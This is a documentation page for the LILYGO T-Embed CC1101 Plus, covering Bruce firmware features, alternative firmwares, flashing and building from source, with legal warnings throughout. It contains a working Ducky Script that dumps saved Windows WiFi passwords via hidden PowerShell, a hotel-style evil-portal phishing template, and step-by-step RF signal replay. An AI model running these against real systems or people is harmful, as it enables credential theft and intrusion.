---
layout: default
title: "03 — Firmware Guide"
nav_order: 4
---

# 03 — Firmware Guide
{: .fs-9 }

Everything you need to know about the firmware ecosystem for the LILYGO T-Embed CC1101 Plus — from installing Bruce to building your own custom firmware from source.
{: .fs-6 .fw-300 }

---

## Table of Contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Bruce Firmware (Primary Recommendation)

### What is Bruce?

**Bruce** is the leading open-source multi-tool firmware for ESP32-based hacking devices. Originally inspired by the Flipper Zero's firmware ecosystem, Bruce has evolved into a standalone powerhouse purpose-built for devices like the LILYGO T-Embed CC1101 Plus. It transforms your sub-$30 hardware into a comprehensive offensive security tool with a polished menu-driven interface.

{: .tip }
> Bruce is under extremely active development. New features land weekly. Always check the GitHub repository for the latest release before flashing.

**GitHub Repository**: [https://github.com/pr3y/Bruce](https://github.com/pr3y/Bruce)

**Key highlights:**
- Full support for the T-Embed CC1101 Plus hardware (display, rotary encoder, CC1101, IR, speaker)
- Menu-driven interface optimized for the 1.9" 170x320 TFT display
- Sub-GHz, WiFi, Bluetooth, IR, BadUSB, and GPIO tool suites
- File manager for saved signals, payloads, and configurations
- OTA (over-the-air) firmware updates
- Active community and frequent releases
- MIT licensed — fully open source

---

### Complete Feature Inventory

#### Sub-GHz Features (CC1101)

The CC1101 sub-GHz transceiver is the heart of the T-Embed's RF capabilities. Bruce unlocks its full potential across the 300-928 MHz range.

| Feature | Description |
|:--------|:-----------|
| **Frequency Analyzer** | Real-time spectrum display showing signal strength across a frequency range. Visualized as a waterfall/bar graph on the TFT display. Helps identify active frequencies before targeted capture. |
| **Scanner** | Sweeps predefined frequency bands (315 MHz, 433 MHz, 868 MHz, 915 MHz) looking for active transmissions. Reports frequency, modulation, and signal strength. |
| **Record** | Captures a decoded digital signal on a specific frequency. Stores the demodulated data (protocol, bits, key) for later replay. Works with common protocols like Princeton, CAME, Nice, Linear, etc. |
| **Replay** | Retransmits a previously recorded signal. Loads from saved files or the most recent capture buffer. |
| **RAW Record** | Captures the raw RF waveform as a series of pulse durations (microseconds high/low). No protocol decoding — captures everything exactly as received. Essential for unknown or proprietary protocols. |
| **RAW Replay** | Retransmits a previously captured RAW recording. Reproduces the exact waveform timing. |
| **Custom Transmit** | Manually configure frequency, modulation (OOK/ASK/FSK/GFSK/MSK), data rate, deviation, and transmit arbitrary hex data. For crafting custom signals and protocol research. |
| **Jammer Detection** | Monitors a frequency band for continuous high-power transmissions that indicate jamming activity. Useful for detecting interference or unauthorized jammers in your environment. |

{: .warning }
> **Transmitting RF signals is regulated by law.** Only transmit on frequencies you are licensed to use, and only target devices you own or have written authorization to test. Jamming is illegal in virtually all jurisdictions.

**Navigating Sub-GHz in Bruce:**

```
Main Menu
 └── Sub-GHz
      ├── Frequency Analyzer
      ├── Scanner
      ├── Record Signal
      │    ├── Select Frequency (manual or preset)
      │    ├── Select Modulation (AM/FM)
      │    └── [Listening... press encoder to stop]
      ├── Replay Signal
      │    ├── From Last Capture
      │    └── From File (browse SD/SPIFFS)
      ├── RAW Record
      │    ├── Select Frequency
      │    └── [Recording... press encoder to stop]
      ├── RAW Replay
      │    └── Select File
      ├── Custom Transmit
      │    ├── Frequency
      │    ├── Modulation
      │    ├── Data Rate
      │    └── Payload (hex)
      └── Jammer Detection
           └── Select Frequency Range
```

**Example: Capturing a garage door signal**

```
1. Navigate: Main Menu → Sub-GHz → Frequency Analyzer
2. Press your garage remote — look for a spike at 315 MHz or 433 MHz
3. Note the frequency (e.g., 433.92 MHz)
4. Navigate: Sub-GHz → Record Signal
5. Set frequency to 433.92 MHz, modulation AM/OOK
6. Press "Start" — the display shows "Listening..."
7. Press the garage remote within range
8. Bruce captures and decodes: "Protocol: Princeton | Key: 0xABCDEF | Bits: 24"
9. Save to file when prompted
10. Navigate: Sub-GHz → Replay Signal → select saved file → Transmit
```

{: .note }
> Modern garage doors use rolling codes (e.g., KeeLoq, Security+ 2.0) which cannot be replayed. The capture/replay workflow is effective for fixed-code systems, older remotes, weather stations, doorbells, and similar simple protocols.

---

#### WiFi Features (ESP32-S3)

Bruce leverages the ESP32-S3's built-in 802.11 b/g/n WiFi radio for network reconnaissance and testing.

| Feature | Description |
|:--------|:-----------|
| **Scanner** | Scans all 2.4 GHz WiFi channels and lists discovered access points with SSID, BSSID, channel, signal strength (RSSI), and encryption type (Open/WEP/WPA/WPA2/WPA3). |
| **Sniffer** | Puts the WiFi radio into promiscuous mode to capture raw 802.11 frames. Logs management, control, and data frames. |
| **Packet Monitor** | Real-time visualization of WiFi packet density per channel. Displays as a live graph — useful for identifying busy channels and monitoring network activity. |
| **Beacon Flood** | Generates hundreds of fake WiFi access points with configurable SSIDs. Creates a "wall" of networks visible to nearby devices. Can use random, sequential, or custom SSID lists. |
| **Deauthentication** | Sends 802.11 deauthentication frames to disconnect clients from an access point. Select specific targets or broadcast. |
| **Evil Portal** | Creates a captive portal WiFi hotspot. When users connect, they are presented with a customizable login page (e.g., mimicking a hotel or coffee shop portal). Captures submitted credentials to the filesystem. |
| **Probe Request Capture** | Passively captures probe request frames broadcast by nearby devices searching for known networks. Reveals SSIDs that devices have previously connected to. |
| **PMKID Capture** | Captures the PMKID (Pairwise Master Key Identifier) from the first EAPOL frame of a WPA2 handshake. This can be used offline with tools like hashcat for password recovery — no client deauthentication required. |

{: .danger }
> **Deauthentication attacks, evil portals, and unauthorized network interception are illegal** unless performed on your own networks or with explicit written authorization. These tools are for authorized penetration testing only.

**WiFi menu structure:**

```
Main Menu
 └── WiFi
      ├── Scan Networks
      │    └── [Displays AP list with RSSI, channel, encryption]
      ├── Sniffer
      │    ├── Select Channel (1-14 or hop)
      │    └── [Capturing frames... saved to .pcap]
      ├── Packet Monitor
      │    └── [Live channel utilization graph]
      ├── Beacon Flood
      │    ├── Random SSIDs
      │    ├── Custom SSID List (from file)
      │    └── Funny SSIDs
      ├── Deauth
      │    ├── Scan → Select Target AP
      │    ├── Select Client (or broadcast)
      │    └── [Sending deauth frames...]
      ├── Evil Portal
      │    ├── Select Portal Template
      │    ├── Configure SSID
      │    └── [Portal active — waiting for connections]
      ├── Probe Capture
      │    └── [Listening for probe requests...]
      └── PMKID
           ├── Scan → Select Target AP
           └── [Waiting for PMKID...]
```

---

#### Bluetooth Features (ESP32-S3 BLE 5.0)

| Feature | Description |
|:--------|:-----------|
| **BLE Scanner** | Discovers nearby BLE devices, showing name, MAC address, RSSI, and advertised services. |
| **Device Enumeration** | Connects to a discovered BLE device and enumerates its GATT services and characteristics. Reveals readable, writable, and notifiable characteristics. |
| **Apple BLE Spam** | Broadcasts crafted BLE advertisement packets that trigger popup notifications on nearby Apple devices (AirPods pairing dialogs, Apple TV prompts, etc.). |
| **Samsung BLE Spam** | Similar to Apple BLE Spam but targets Samsung/Galaxy devices using Samsung-specific BLE advertisement formats. |
| **Windows Swift Pair Spam** | Broadcasts BLE advertisements mimicking Microsoft Swift Pair devices, triggering pairing popups on Windows 10/11 machines. |
| **BLE Tracker Detection** | Scans for known BLE tracker signatures (AirTag, Tile, SmartTag) to detect if you are being tracked by an unknown device. |

{: .note }
> BLE spam features are disruptive but generally cause only popup annoyances on target devices. They are primarily useful for demonstrating BLE advertisement vulnerabilities in authorized security awareness training.

---

#### IR Features (Infrared)

The T-Embed CC1101 Plus includes both an IR transmitter LED and an IR receiver, enabling full infrared capture and replay.

| Feature | Description |
|:--------|:-----------|
| **Receive/Decode** | Points the IR receiver at a remote control, captures the signal, and decodes the protocol (NEC, Samsung, Sony, RC5, RC6, Panasonic, etc.), address, and command values. |
| **Transmit** | Sends a specific IR command using a selected protocol, address, and command value. |
| **Saved Signals** | Browse and transmit previously captured IR signals from the filesystem. |
| **TV-B-Gone** | Cycles through a comprehensive database of known TV power-off codes across all major manufacturers. Turns off virtually any television within IR range. |
| **Custom Protocol** | Manually define protocol, address, command, and repeat count for crafting specific IR signals. |

**IR menu structure:**

```
Main Menu
 └── Infrared
      ├── Receive
      │    └── [Point remote at device... decoded: NEC 0x04 0x08]
      ├── Transmit
      │    ├── Select Protocol
      │    ├── Enter Address
      │    └── Enter Command
      ├── Saved Signals
      │    └── [Browse filesystem → select → transmit]
      ├── TV-B-Gone
      │    ├── Americas (NTSC)
      │    └── Europe/Asia (PAL)
      └── Custom
           ├── Protocol
           ├── Address
           ├── Command
           └── Repeat Count
```

{: .tip }
> TV-B-Gone is a classic demonstration tool. It cycles through hundreds of manufacturer power codes — it takes about 60 seconds to cycle through the full database. Point the device toward the TV and give it time to find the right code.

---

#### BadUSB Features (USB-C OTG)

The ESP32-S3's native USB OTG support enables the T-Embed to appear as a USB HID keyboard to any connected computer.

| Feature | Description |
|:--------|:-----------|
| **Ducky Script Support** | Execute payloads written in Hak5 Ducky Script syntax. Supports `STRING`, `DELAY`, `GUI`, `CTRL`, `ALT`, `SHIFT`, `ENTER`, `TAB`, and all standard Ducky Script commands. |
| **Predefined Payloads** | Built-in collection of common payloads: open reverse shell, exfiltrate WiFi passwords, disable AV, Rick Roll, and more. |
| **Custom Payload Upload** | Load your own `.txt` Ducky Script files via the filesystem (SPIFFS or SD card) and execute them. |

**Example Ducky Script payload (WiFi password exfiltration on Windows):**

```
REM Extract saved WiFi passwords on Windows
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1000
STRING netsh wlan show profiles | Select-String 'All User' | ForEach-Object { $_ -replace '.*:\s+', '' } | ForEach-Object { netsh wlan show profile name="$_" key=clear } | Select-String 'Key Content' | Out-File $env:TEMP\wifi.txt
ENTER
DELAY 2000
STRING exit
ENTER
```

{: .warning }
> BadUSB payloads execute as a trusted keyboard input on the target machine. They can cause real damage. Only use on systems you own or have written authorization to test.

---

#### NRF24 Features (External Module Required)

{: .note }
> NRF24 features require an **external NRF24L01+ module** connected via the GPIO expansion header (SPI interface). This module is not included with the T-Embed CC1101 Plus.

| Feature | Description |
|:--------|:-----------|
| **Sniffer** | Captures packets on the 2.4 GHz NRF24 protocol bands. Can monitor specific addresses or promiscuously scan channels. |
| **Mouse Jacker** | Exploits vulnerabilities in wireless mice and keyboards that use NRF24-based protocols (e.g., Logitech Unifying, Microsoft wireless peripherals). Can inject keystrokes into vulnerable wireless keyboards or take over wireless mouse input. |

**NRF24L01+ wiring to T-Embed GPIO header:**

```
NRF24L01+        T-Embed GPIO
─────────        ───────────
VCC (3.3V)  ───  3.3V
GND         ───  GND
CE          ───  GPIO 6
CSN         ───  GPIO 7
SCK         ───  GPIO 5
MOSI        ───  GPIO 3
MISO        ───  GPIO 4
IRQ         ───  (optional)
```

{: .tip }
> Check the Bruce documentation or source code for the exact GPIO pin assignments for your firmware version, as these may change between releases.

---

#### RFID Features (External Module Required)

{: .note }
> RFID features require an **external RFID reader/writer module** (RC522 for 13.56 MHz MIFARE, or a 125 kHz module for EM4100/HID). Connected via SPI or I2C through the GPIO expansion header.

| Feature | Description |
|:--------|:-----------|
| **Read** | Reads UID, type, and data blocks from RFID cards and fobs. Supports MIFARE Classic 1K/4K and other 13.56 MHz standards. |
| **Write** | Writes data to writable RFID cards (MIFARE Classic, NTAG, T5577). Can clone card UIDs to blank "magic" cards. |
| **Emulate** | Emulates a captured RFID card UID (limited by the external module's capabilities — true emulation requires specific hardware). |

---

#### Tools and Utilities

| Feature | Description |
|:--------|:-----------|
| **File Manager** | Browse, view, delete, and manage files on SPIFFS (internal flash filesystem) and SD card (if connected via GPIO). Navigate directories, view file contents, and manage saved signals/payloads. |
| **Settings** | Configure display brightness, rotation, WiFi credentials (for OTA updates), clock, timezone, speaker volume, LED brightness, and hardware-specific options. |
| **About** | Displays firmware version, build date, hardware info, memory usage, and credits. |
| **OTA Update** | Connect to WiFi and check for/install firmware updates directly from the Bruce GitHub releases. No USB cable needed for updates after initial flash. |
| **Clock** | Displays a real-time clock (synced via NTP when WiFi is connected). Multiple clock face styles available. |

---

### Menu Navigation Deep Dive

Bruce uses the T-Embed's **rotary encoder** and **push button** as the primary input method. The interface is designed for one-handed operation.

**Controls:**

| Input | Action |
|:------|:-------|
| **Rotate clockwise** | Move selection down / increase value |
| **Rotate counter-clockwise** | Move selection up / decrease value |
| **Short press (click)** | Select / confirm |
| **Long press (~1 second)** | Back / cancel / return to parent menu |
| **Double press** | Context action (varies by screen) |

**Main menu structure:**

```
Bruce Main Menu
 ├── Sub-GHz          → All CC1101 radio features
 ├── WiFi             → All 802.11 features
 ├── Bluetooth        → All BLE features
 ├── Infrared         → All IR features
 ├── BadUSB           → USB HID keyboard payloads
 ├── NRF24            → NRF24L01+ features (if connected)
 ├── RFID             → RFID features (if connected)
 ├── Tools
 │    ├── File Manager
 │    ├── Clock
 │    └── Speaker Test
 ├── Settings
 │    ├── Display Brightness
 │    ├── Display Rotation
 │    ├── WiFi Configuration
 │    ├── Clock / Timezone
 │    ├── Speaker Volume
 │    ├── LED Settings
 │    └── Reset to Defaults
 ├── About
 └── OTA Update
```

{: .tip }
> If you ever get lost in a deep menu, a **long press** on the encoder button will always take you back one level. Multiple long presses will eventually return you to the main menu.

---

### Settings and Configuration Options

Bruce stores its configuration in the internal SPIFFS filesystem as JSON files.

**Key configuration areas:**

| Setting | Options | Notes |
|:--------|:--------|:------|
| **Display Brightness** | 0-255 (slider) | Lower brightness extends battery life |
| **Display Rotation** | 0, 90, 180, 270 degrees | Match your physical mounting orientation |
| **WiFi SSID/Password** | Text input via encoder | Required for OTA updates and Evil Portal |
| **Clock Source** | NTP (auto), Manual | NTP requires WiFi connection |
| **Timezone** | UTC offset | Applied to clock display |
| **Speaker Volume** | 0-10 | 0 = mute, affects all audio output |
| **LED Brightness** | 0-255 | Controls onboard status LED |
| **Default Frequency** | Hz value | Default sub-GHz frequency for quick scan |
| **Modulation** | AM/FM/RAW | Default sub-GHz modulation |

---

### Saving and Loading Signal Files

Bruce uses the internal SPIFFS filesystem (and optional SD card) to persist captured signals, payloads, and configurations.

**Default directory structure:**

```
/bruce/
 ├── subghz/
 │    ├── captures/          ← Decoded signal captures
 │    │    └── garage_433.sub
 │    └── raw/               ← RAW waveform captures
 │         └── unknown_315.raw
 ├── ir/
 │    └── captures/          ← IR signal captures
 │         └── tv_power.ir
 ├── badusb/
 │    └── payloads/          ← Ducky Script files
 │         └── rickroll.txt
 ├── wifi/
 │    ├── portals/           ← Evil Portal HTML templates
 │    │    └── hotel.html
 │    └── captures/          ← PMKID, handshake captures
 ├── nrf24/
 │    └── captures/
 └── config/
      └── settings.json      ← Global configuration
```

**Saving a signal:**

After capturing a signal (sub-GHz, IR, etc.), Bruce prompts:

```
Signal Captured!
Protocol: Princeton
Key: 0xABCDEF
Bits: 24

[Save] [Replay] [Discard]
```

Selecting **Save** opens a file name dialog where you enter a name using the rotary encoder to cycle through characters.

**Loading a signal:**

Navigate to the appropriate replay menu and select **From File**. The file manager opens showing the relevant directory. Scroll to your saved file and press the encoder to select it.

---

### File Format Specifications

#### Sub-GHz Decoded Signal (`.sub`)

```
Filetype: Bruce SubGhz
Version: 1
Frequency: 433920000
Preset: FuriHalSubGhzPresetOok650Async
Protocol: Princeton
Bit: 24
Key: 00 00 00 00 00 AB CD EF
TE: 350
```

| Field | Description |
|:------|:-----------|
| `Frequency` | Carrier frequency in Hz |
| `Preset` | Radio preset (modulation + data rate config) |
| `Protocol` | Decoded protocol name |
| `Bit` | Bit length of the key |
| `Key` | Hex-encoded key value (MSB first) |
| `TE` | Timing element — base pulse duration in microseconds |

{: .note }
> Bruce's `.sub` file format is compatible with Flipper Zero's `.sub` format. You can transfer signal files between the two devices.

#### Sub-GHz RAW Signal (`.raw` or `.sub` with RAW type)

```
Filetype: Bruce SubGhz RAW
Version: 1
Frequency: 433920000
Preset: FuriHalSubGhzPresetOok650Async
RAW_Data: 350 -700 350 -350 700 -350 350 -700 350 -350 ...
```

| Field | Description |
|:------|:-----------|
| `RAW_Data` | Series of pulse durations in microseconds. Positive values = signal high, negative values = signal low. |

#### IR Signal (`.ir`)

```
Filetype: Bruce IR
Version: 1
name: TV_Power
type: parsed
protocol: NEC
address: 04 00 00 00
command: 08 00 00 00
```

For raw IR captures:

```
Filetype: Bruce IR
Version: 1
name: Unknown_IR
type: raw
frequency: 38000
duty_cycle: 0.330000
data: 9000 4500 560 560 560 1690 560 560 ...
```

#### BadUSB Payload (`.txt`)

Standard Hak5 Ducky Script format:

```
REM This is a comment
DELAY 1000
GUI r
DELAY 500
STRING notepad
ENTER
DELAY 1000
STRING Hello from Bruce!
ENTER
```

---

### OTA Updates

Bruce supports over-the-air firmware updates when connected to WiFi.

**OTA update procedure:**

```
1. Navigate: Main Menu → Settings → WiFi Configuration
2. Enter your WiFi SSID and password
3. Confirm connection (status shows IP address)
4. Navigate: Main Menu → OTA Update
5. Bruce checks GitHub releases for the latest version
6. Display shows:
     Current: v1.5.0
     Latest:  v1.6.0
     [Update] [Cancel]
7. Select "Update" — download progress bar appears
8. Device reboots automatically into new firmware
```

{: .warning }
> Do not power off the device during an OTA update. Interrupting the flash process can brick the device (recoverable via USB reflash, but inconvenient). Ensure stable WiFi and sufficient battery/power.

---

## Alternative Firmware Options

### ESP-Flipper

**ESP-Flipper** is a community firmware that aims to replicate the Flipper Zero experience on ESP32-based hardware. It provides a familiar interface for users coming from the Flipper Zero ecosystem.

**Features and capabilities:**
- Sub-GHz signal capture and replay (CC1101)
- WiFi scanning and basic attacks
- BLE scanning
- IR capture and replay
- Flipper Zero-compatible file formats
- UI styled to mimic Flipper Zero's interface

**How it differs from Bruce:**

| Aspect | Bruce | ESP-Flipper |
|:-------|:------|:-----------|
| **Development pace** | Very active, weekly updates | Less frequent updates |
| **Feature breadth** | Broader feature set | Focused on Flipper parity |
| **UI style** | Custom, optimized for T-Embed | Flipper Zero inspired |
| **File compatibility** | Flipper-compatible formats | Flipper-native formats |
| **Hardware support** | Wide ESP32 device support | Narrower device support |
| **Community size** | Larger | Smaller |
| **WiFi features** | Comprehensive (evil portal, deauth, etc.) | Basic scanning |

**Installation procedure:**

```bash
# 1. Download the latest ESP-Flipper release for T-Embed CC1101
# From the project's GitHub releases page, download the .bin file
# matching your board variant

# 2. Flash using esptool
esptool.py --chip esp32s3 --port /dev/cu.usbmodem* \
  --baud 921600 write_flash \
  --flash_mode dio --flash_freq 80m --flash_size 16MB \
  0x0 esp-flipper-t-embed-cc1101.bin
```

Expected output:

```
esptool.py v4.7.0
Serial port /dev/cu.usbmodem14101
Connecting...
Chip is ESP32-S3
Uploading stub...
Running stub...
Changing baud rate to 921600
Changed.
Configuring flash size...
Flash will be erased from 0x00000000 to 0x002fffff...
Wrote 3145728 bytes at 0x00000000 in 12.4 seconds (2029.0 kbit/s)...
Hash of data verified.

Leaving...
Hard resetting via RTS pin...
```

**When to use ESP-Flipper over Bruce:**
- You are already deeply familiar with Flipper Zero and want a similar experience
- You need maximum file format compatibility with a Flipper Zero for signal sharing
- You prefer a simpler, more focused feature set
- Bruce has a specific bug that ESP-Flipper does not

{: .tip }
> For most users, **Bruce is the better choice** due to its broader feature set, faster development cycle, and better hardware optimization for the T-Embed CC1101 Plus.

---

### Marauder (WiFi Focused)

**ESP32 Marauder** is a specialized WiFi/Bluetooth offensive security firmware originally developed for the ESP32. It offers the most comprehensive WiFi attack suite of any ESP32 firmware.

**WiFi attack capabilities:**
- Full 802.11 packet capture with `.pcap` export
- Deauthentication attacks (targeted and broadcast)
- Beacon flood with extensive customization
- Probe request monitoring and logging
- PMKID capture for offline cracking
- Evil portal with multiple templates
- WiFi rickroll (beacon spam with Rick Astley lyrics)
- Channel hopping with configurable dwell time
- Station and AP enumeration
- Karma attack (responding to all probe requests)
- Bluetooth sniffing and BLE enumeration

**Installation on T-Embed:**

```bash
# 1. Download Marauder firmware for ESP32-S3
# Ensure you get the correct variant for the T-Embed's display and pinout

# 2. Flash using esptool
esptool.py --chip esp32s3 --port /dev/cu.usbmodem* \
  --baud 921600 write_flash \
  --flash_mode dio --flash_freq 80m --flash_size 16MB \
  0x0 esp32_marauder_t_embed.bin
```

**Feature comparison (WiFi-specific):**

| WiFi Feature | Bruce | Marauder |
|:-------------|:------|:---------|
| Network scanning | Yes | Yes |
| Deauthentication | Yes | Yes (more options) |
| Beacon flood | Yes | Yes (more templates) |
| Evil portal | Yes | Yes (more templates) |
| PMKID capture | Yes | Yes |
| `.pcap` export | Basic | Full |
| Karma attack | No | Yes |
| Channel hopping | Basic | Advanced |
| Bluetooth scan | Yes | Yes |
| **Sub-GHz (CC1101)** | **Yes** | **No** |
| **IR** | **Yes** | **No** |
| **BadUSB** | **Yes** | **No** |

{: .note }
> Marauder excels at WiFi operations but does **not** support the CC1101 sub-GHz radio, IR, or BadUSB. If you want WiFi-only focus, Marauder is excellent. For a complete multi-tool experience, use Bruce.

---

### Stock / Factory Firmware

**What comes pre-loaded:**

The T-Embed CC1101 Plus ships with a basic demonstration firmware from LILYGO that showcases the hardware:
- Display test (color bars, text rendering)
- WiFi scan demo
- CC1101 basic receive demo
- Button/encoder test
- IR receive test
- Speaker tone test

This firmware is useful only for verifying hardware functionality out of the box. It has no practical security testing features.

**Restoring factory firmware:**

If you need to return to the stock firmware (e.g., for warranty purposes or hardware testing):

```bash
# 1. Download the factory firmware from LILYGO's GitHub
git clone https://github.com/Xinyuan-LilyGO/T-Embed-CC1101.git
cd T-Embed-CC1101/firmware

# 2. Flash the factory image
esptool.py --chip esp32s3 --port /dev/cu.usbmodem* \
  --baud 921600 write_flash \
  --flash_mode dio --flash_freq 80m --flash_size 16MB \
  0x0000 bootloader.bin \
  0x8000 partitions.bin \
  0x10000 firmware.bin

# Expected output:
# esptool.py v4.7.0
# Connecting...
# Chip is ESP32-S3 (revision v0.2)
# Uploading stub...
# Configuring flash size...
# Flash will be erased from 0x00000000 to 0x00007fff...
# Flash will be erased from 0x00008000 to 0x00008fff...
# Flash will be erased from 0x00010000 to 0x001fffff...
# Wrote 32768 bytes at 0x00000000 in 0.3 seconds...
# Wrote 4096 bytes at 0x00008000 in 0.1 seconds...
# Wrote 2031616 bytes at 0x00010000 in 8.2 seconds...
# Hash of data verified.
# Leaving...
```

{: .tip }
> Before flashing any alternative firmware, save the factory firmware binary by reading it back from flash. This ensures you can always restore the original state: `esptool.py --chip esp32s3 --port /dev/cu.usbmodem* read_flash 0x0 0x1000000 factory_backup.bin`

---

## Building Custom Firmware from Source

### Cloning the Bruce Repository

```bash
# Clone the Bruce repository
git clone --recursive https://github.com/pr3y/Bruce.git
cd Bruce

# Expected output:
# Cloning into 'Bruce'...
# remote: Enumerating objects: 15234, done.
# remote: Counting objects: 100% (3456/3456), done.
# remote: Compressing objects: 100% (1234/1234), done.
# remote: Total 15234 (delta 2345), reused 3012 (delta 2012)
# Receiving objects: 100% (15234/15234), 45.67 MiB | 12.34 MiB/s, done.
# Resolving deltas: 100% (10234/10234), done.
# Submodule 'components/...' registered for path '...'
# ...

# Verify the clone
ls -la

# Expected:
# drwxr-xr-x  .github/
# drwxr-xr-x  boards/
# drwxr-xr-x  components/
# drwxr-xr-x  data/
# drwxr-xr-x  include/
# drwxr-xr-x  lib/
# drwxr-xr-x  src/
# -rw-r--r--  platformio.ini
# -rw-r--r--  README.md
# -rw-r--r--  LICENSE
```

{: .note }
> The `--recursive` flag is important because Bruce uses git submodules for some dependencies. Without it, certain libraries will be missing and the build will fail.

---

### Understanding the Codebase Structure

```
Bruce/
 ├── .github/                   # CI/CD workflows, issue templates
 ├── boards/                    # Board-specific pin definitions
 │    ├── t-embed-cc1101/       # T-Embed CC1101 Plus config
 │    │    ├── pins.h           # GPIO pin assignments
 │    │    ├── board_config.h   # Display, radio, feature flags
 │    │    └── partitions.csv   # Flash partition layout
 │    ├── cardputer/            # M5Stack Cardputer config
 │    └── ...                   # Other supported boards
 ├── components/                # External libraries (submodules)
 │    ├── CC1101/               # CC1101 radio driver
 │    ├── TFT_eSPI/             # Display driver
 │    ├── IRremoteESP8266/      # IR protocol library
 │    └── ...
 ├── data/                      # SPIFFS filesystem data
 │    ├── badusb/               # Default BadUSB payloads
 │    ├── ir/                   # IR code databases
 │    ├── portals/              # Evil portal HTML templates
 │    └── web/                  # Web interface assets
 ├── include/                   # Global header files
 │    ├── globals.h             # Global variables and defines
 │    └── config.h              # Build-time configuration
 ├── lib/                       # Internal libraries
 │    ├── subghz/               # Sub-GHz protocol decoders
 │    ├── wifi_attacks/         # WiFi attack implementations
 │    ├── ble/                  # BLE scanning and spam
 │    ├── ir/                   # IR capture/replay logic
 │    ├── badusb/               # USB HID implementation
 │    ├── ui/                   # Menu system, display rendering
 │    └── utils/                # Helpers, file I/O, JSON parsing
 ├── src/
 │    └── main.cpp              # Entry point, setup(), loop()
 ├── platformio.ini             # PlatformIO build configuration
 └── README.md
```

**Key files for the T-Embed CC1101 Plus:**

| File | Purpose |
|:-----|:--------|
| `boards/t-embed-cc1101/pins.h` | GPIO pin mapping for CC1101, display, encoder, IR, speaker |
| `boards/t-embed-cc1101/board_config.h` | Feature enable/disable flags, display resolution, radio config |
| `boards/t-embed-cc1101/partitions.csv` | Flash memory layout (bootloader, app, SPIFFS, NVS) |
| `platformio.ini` | Build environments, library dependencies, upload settings |
| `src/main.cpp` | Application entry point — initializes hardware and starts menu |

---

### Modifying Existing Features

**Example: Changing the default sub-GHz frequency**

```cpp
// File: boards/t-embed-cc1101/board_config.h

// Change default frequency from 433.92 MHz to 315 MHz
// Find this line:
#define DEFAULT_SUBGHZ_FREQUENCY 433920000

// Change to:
#define DEFAULT_SUBGHZ_FREQUENCY 315000000
```

**Example: Adding a custom Evil Portal template**

```bash
# Create a new HTML file in the data directory
cat > data/portals/custom_hotel.html << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
  <title>Hotel WiFi - Guest Login</title>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; padding: 40px; }
    input { display: block; margin: 10px auto; padding: 8px; width: 200px; }
    button { padding: 10px 30px; background: #007bff; color: white; border: none; }
  </style>
</head>
<body>
  <h1>Welcome to Grand Hotel</h1>
  <p>Enter your room number and last name to connect.</p>
  <form action="/capture" method="POST">
    <input name="room" placeholder="Room Number" required>
    <input name="name" placeholder="Last Name" required>
    <input name="email" placeholder="Email" type="email">
    <button type="submit">Connect</button>
  </form>
</body>
</html>
HTMLEOF
```

**Example: Modifying menu text or adding menu items**

The menu system is defined in the UI library. Each menu screen is a function that renders items and handles encoder input:

```cpp
// File: lib/ui/menu.cpp (structure varies by version)

// To add a new item to the Sub-GHz menu:
void subghzMenu() {
    int selected = 0;
    String items[] = {
        "Frequency Analyzer",
        "Scanner",
        "Record Signal",
        "Replay Signal",
        "RAW Record",
        "RAW Replay",
        "Custom Transmit",
        "Jammer Detection",
        "My Custom Feature"   // ← Add your new item here
    };
    // ...
}
```

---

### Adding New Features

To add a completely new feature to Bruce:

**1. Create the implementation file:**

```cpp
// File: lib/my_feature/my_feature.h
#ifndef MY_FEATURE_H
#define MY_FEATURE_H

void myFeatureSetup();
void myFeatureLoop();
void myFeatureMenu();

#endif

// File: lib/my_feature/my_feature.cpp
#include "my_feature.h"
#include "globals.h"
#include "ui/display.h"

void myFeatureSetup() {
    // Initialize hardware or state
}

void myFeatureLoop() {
    // Main feature logic
}

void myFeatureMenu() {
    // Render menu and handle input
    drawHeader("My Feature");
    drawMenuItem("Option 1", 0, selected == 0);
    drawMenuItem("Option 2", 1, selected == 1);
    // Handle encoder rotation and button press
}
```

**2. Register in the menu system:**

```cpp
// File: lib/ui/menu.cpp
#include "my_feature/my_feature.h"

// Add to the appropriate parent menu
case MY_FEATURE_INDEX:
    myFeatureMenu();
    break;
```

**3. Add board support flags (optional):**

```cpp
// File: boards/t-embed-cc1101/board_config.h
#define HAS_MY_FEATURE 1
```

---

### Compilation Environments

#### PlatformIO (Recommended)

PlatformIO is the primary and recommended build system for Bruce.

**Installation:**

```bash
# Install PlatformIO CLI
pip install platformio

# Verify installation
pio --version
# Expected: PlatformIO Core, version 6.x.x
```

**Building for T-Embed CC1101 Plus:**

```bash
cd Bruce

# List available build environments
pio run --list-targets
# Expected output includes: t-embed-cc1101

# Build the firmware
pio run -e t-embed-cc1101

# Expected output:
# Processing t-embed-cc1101 (platform: espressif32; board: ...)
# ...
# Compiling .pio/build/t-embed-cc1101/src/main.cpp.o
# Compiling .pio/build/t-embed-cc1101/lib/...
# ...
# Linking .pio/build/t-embed-cc1101/firmware.elf
# Building .pio/build/t-embed-cc1101/firmware.bin
# Creating esp32s3 image...
# Successfully created esp32s3 image.
# ========================= [SUCCESS] =========================
# Environment    Status    Duration
# -------------  --------  ----------
# t-embed-cc1101 SUCCESS   00:01:45
```

**Flashing via PlatformIO:**

```bash
# Build and flash in one command
pio run -e t-embed-cc1101 --target upload

# Expected output:
# ...
# Uploading .pio/build/t-embed-cc1101/firmware.bin
# esptool.py v4.7.0
# Serial port /dev/cu.usbmodem14101
# Connecting...
# Writing at 0x00010000... (3%)
# Writing at 0x00020000... (6%)
# ...
# Writing at 0x001f0000... (100%)
# Wrote 2031616 bytes (1234567 compressed) in 12.3 seconds
# Hash of data verified.
# Leaving...
# ========================= [SUCCESS] =========================
```

**Uploading SPIFFS filesystem data:**

```bash
pio run -e t-embed-cc1101 --target uploadfs

# This uploads the contents of data/ to the SPIFFS partition
# Expected output:
# Building SPIFFS image from 'data' directory
# ...
# Uploading .pio/build/t-embed-cc1101/spiffs.bin
# Wrote 1048576 bytes in 4.5 seconds
# ========================= [SUCCESS] =========================
```

#### Arduino IDE (Alternative)

The Arduino IDE can also build Bruce, though PlatformIO is preferred for its dependency management and multi-environment support.

**Setup:**

```
1. Install Arduino IDE 2.x from https://www.arduino.cc/en/software

2. Add ESP32-S3 board support:
   - File → Preferences → Additional Board Manager URLs
